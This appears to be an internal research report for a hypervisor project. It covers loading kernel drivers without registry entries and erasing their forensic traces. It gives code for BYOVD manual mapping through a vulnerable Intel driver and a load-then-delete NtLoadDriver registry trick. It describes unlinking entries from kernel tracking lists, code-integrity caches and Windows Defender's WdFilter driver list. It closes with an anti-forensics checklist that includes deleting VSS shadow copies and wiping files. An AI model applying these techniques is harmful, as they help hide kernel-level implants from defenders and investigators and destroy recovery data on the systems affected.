# Registry & Service Artifact Elimination Research Report
**Project**: Ombra Hypervisor V3
**Research Focus**: Registry-less driver loading and forensic artifact cleanup
**Date**: December 24, 2025

---

## Executive Summary

This report documents registry-less driver loading techniques, forensic artifact elimination strategies, and transaction log cleanup methodologies for the Ombra Hypervisor project. Research covers manual driver mapping (kdmapper-style), kernel trace structure cleanup (MmUnloadedDrivers, PiDDBCacheTable, g_KernelHashBucketList), and registry artifact elimination approaches.

**Key Finding**: The Ombra codebase already implements comprehensive trace cleaning via the kdmapper library, but current `driver_deployer.cpp` still creates full registry entries. Manual mapping or export driver techniques can eliminate registry footprint entirely.

---

## I. Current Artifact Footprint Analysis

### A. Existing Implementation (OmbraLoader/supdrv/driver_deployer.cpp)

**Registry Artifacts Created**:
```
HKLM\SYSTEM\CurrentControlSet\Services\Ld9BoxSup
├── ImagePath (REG_EXPAND_SZ): \??\<driver_path>
├── Type (REG_DWORD): 1 (SERVICE_KERNEL_DRIVER)
├── Start (REG_DWORD): 3 (SERVICE_DEMAND_START)
└── ErrorControl (REG_DWORD): 1 (SERVICE_ERROR_NORMAL)
```

**File System Artifacts**:
- Driver binary: `%SystemRoot%\System32\drivers\Ld9BoxSup.sys` (or temp directory)
- Transaction logs: `%SystemRoot%\System32\config\SYSTEM.LOG1`, `SYSTEM.LOG2`

**Deployment Methods**:
1. **SCM (Service Control Manager)**: Lines 507-631
   - Creates service via `CreateServiceW()`
   - Full registry entries persist until `DeleteService()`
   - Visible in `sc query` output while running

2. **NtLoadDriver**: Lines 736-841
   - Manually creates registry keys via `RegCreateKeyExW()`
   - Calls `NtLoadDriver()` with registry path
   - Cleanup via `DeleteDriverRegistry()` after unload

**Both methods leave forensic traces** in registry transaction logs even after cleanup.

---

## II. Registry-Less Loading Techniques

### A. Manual Driver Mapping (kdmapper Approach)

**Concept**: Load driver into kernel memory via vulnerable driver exploit, bypassing NtLoadDriver entirely.

**Implementation** (OmbraCoreLib/kdmapper_lib/kdmapper/):

```cpp
// 1. Load vulnerable BYOVD (Bring Your Own Vulnerable Driver)
HANDLE vuln_driver = intel_driver::Load();  // Creates temporary service

// 2. Allocate kernel pool memory
uint64_t kernel_pool = intel_driver::AllocatePool(
    device_handle,
    NonPagedPool,
    driver_image_size
);

// 3. Map PE sections manually
for (auto section : pe_sections) {
    intel_driver::WriteMemory(
        device_handle,
        kernel_pool + section.VirtualAddress,
        section.RawData,
        section.SizeOfRawData
    );
}

// 4. Process relocations
intel_driver::ApplyRelocations(device_handle, kernel_pool, reloc_delta);

// 5. Call DriverEntry manually via kernel function call
intel_driver::CallKernelFunction(
    device_handle,
    nullptr,
    kernel_pool + EntryPointRVA,
    nullptr,  // DriverObject = NULL
    nullptr   // RegistryPath = NULL
);

// 6. Clean traces (detailed in Section III)
intel_driver::ClearMmUnloadedDrivers(device_handle);
intel_driver::ClearPiDDBCacheTable(device_handle);
intel_driver::ClearKernelHashBucketList(device_handle);

// 7. Unload vulnerable driver + cleanup
intel_driver::Unload(device_handle);
```

**Advantages**:
- **Zero registry entries** for target driver
- No SCM interaction
- Loaded driver not in `PsLoadedModulesList`
- DriverObject and RegistryPath are NULL in DriverEntry

**Disadvantages**:
- Requires vulnerable driver (temporarily leaves traces)
- More complex implementation
- PatchGuard detection risk (callbacks outside known modules)
- Vulnerable driver itself creates registry entry during load phase

### B. Export Driver Technique

**Concept**: Load as kernel-mode DLL without full driver infrastructure.

**Characteristics**:
- No dispatch table
- No place in driver stack
- **No SCM database entry**
- Entry point: `DllInitialize` (not `DriverEntry`)
- Must reside in `%Windir%\System32\Drivers`
- Loaded automatically when another driver imports it

### C. NtLoadDriver Without Persistent Registry (Temporary Keys)

**Concept**: Create registry entries in volatile location, load driver, delete immediately.

```cpp
// 1. Create temporary registry key
std::wstring temp_service = GenerateRandomServiceName();
std::wstring reg_path = L"SYSTEM\\CurrentControlSet\\Services\\" + temp_service;

CreateDriverRegistry(driver_path, temp_service.c_str());

// 2. Load driver
std::wstring nt_reg_path = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + temp_service;
UNICODE_STRING usDriverPath;
RtlInitUnicodeString(&usDriverPath, nt_reg_path.c_str());

NtLoadDriver(&usDriverPath);

// 3. Immediately delete registry key (driver still loaded!)
RegDeleteKeyW(HKEY_LOCAL_MACHINE, reg_path.c_str());

// Driver continues running with no registry entry
```

**Key Insight**: **Registry entry only needed during NtLoadDriver call**. After driver initializes, deleting the key does not unload the driver.

---

## III. Kernel Trace Structure Cleanup

### A. MmUnloadedDrivers

**Purpose**: Windows kernel maintains list of recently unloaded drivers for debugging.

**Cleanup Implementation** (intel_driver.cpp:547-639):
- Find vulnerable driver's DEVICE_OBJECT via handle
- Traverse: Object → DEVICE_OBJECT → DRIVER_OBJECT → DRIVER_SECTION
- Zero out UNICODE_STRING length field at DriverSection+0x58
- Effect: MiRememberUnloadedDriver skips adding entry

### B. PiDDBCacheTable

**Purpose**: Plug and Play Driver Database cache (AVL tree tracking all loaded drivers).

**Cleanup Implementation** (intel_driver.cpp:728-880):
- Pattern scan for PiDDBLock and PiDDBCacheTable
- Acquire exclusive lock
- Lookup entry by timestamp + driver name
- Unlink from doubly-linked list
- Delete from AVL table
- Decrement DeleteCount
- Release lock

### C. g_KernelHashBucketList (ci.dll)

**Purpose**: Code Integrity module tracks driver hashes for signature verification.

**Cleanup Implementation** (intel_driver.cpp:936-1078):
- Find ci.dll module
- Pattern scan for g_KernelHashBucketList and g_HashCacheLock
- Acquire lock, walk linked list, find target entry
- Unlink from list, free pool memory

### D. WdFilter RuntimeDriverList (Windows Defender)

**Purpose**: Windows Defender tracks loaded filter drivers.

**Cleanup Implementation** (intel_driver.cpp:641-696):
- Find WdFilter.sys module
- Pattern scan for RuntimeDriverList
- Walk LIST_ENTRY structure, find and unlink target

---

## IV. Recommended Implementation Strategy

### Option A: Kdmapper Manual Mapping (MOST STEALTHY)

**Strengths**:
- Zero registry entries for target driver
- Already implemented in `OmbraCoreLib/kdmapper_lib/`
- Comprehensive trace cleaning

**Weaknesses**:
- Vulnerable driver (iqvw64e.sys) creates temporary artifacts
- More complex than NtLoadDriver
- Requires ongoing vulnerable driver updates

### Option B: Temporary NtLoadDriver (MINIMAL CHANGES)

**Strengths**:
- Simplest implementation
- Minimal code changes to existing `DriverDeployer`
- Uses legitimate NtLoadDriver API

**Implementation**:
```cpp
// driver_deployer.cpp:793 (after NtLoadDriver)
NTSTATUS status = NtLoadDriver(&usDriverPath);

if (status == STATUS_SUCCESS || status == STATUS_IMAGE_ALREADY_LOADED) {
    // IMMEDIATE CLEANUP - Delete registry key while driver still loaded
    DeleteDriverRegistry(pResource->wszServiceName);

    // Flush to force transaction log write
    HKEY hSystemKey;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hSystemKey);
    RegFlushKey(hSystemKey);
    RegCloseKey(hSystemKey);
}
```

---

## V. Complete Forensic Artifact Elimination Checklist

### Pre-Deployment Phase
- [ ] Randomize Service Name (10-20 chars)
- [ ] Use Temp Directory instead of System32\drivers
- [ ] Exclude from VSS Backups (KeysNotToRestore)

### During Deployment Phase
- [ ] Method Selection (Manual Mapping vs Temporary NtLoadDriver)
- [ ] Driver File Obfuscation (zero PE headers, randomize pool tag)

### Post-Load Phase
- [ ] ClearMmUnloadedDrivers()
- [ ] ClearPiDDBCacheTable()
- [ ] ClearKernelHashBucketList()
- [ ] ClearWdFilterDriverList()
- [ ] Delete service key immediately after load

### Post-Unload Phase
- [ ] Overwrite driver file with random data before delete
- [ ] Delete VSS shadow copies (vssadmin delete shadows)
- [ ] Flush registry hive (RegFlushKey)

---

## SOURCES

- [KDMapper GitHub](https://github.com/TheCruZ/kdmapper)
- [Tarlogic: SeLoadDriverPrivilege Exploitation](https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/)
- [Microsoft: Creating Export Drivers](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/creating-export-drivers/)
- [Andrea Fortuna: Registry Transaction Logs](https://andreafortuna.org/2021/02/06/windows-registry-transaction-logs-in-forensic-analysis/)
- [Samuel Tulach: Detecting Manually Mapped Drivers](https://tulach.cc/detecting-manually-mapped-drivers/)
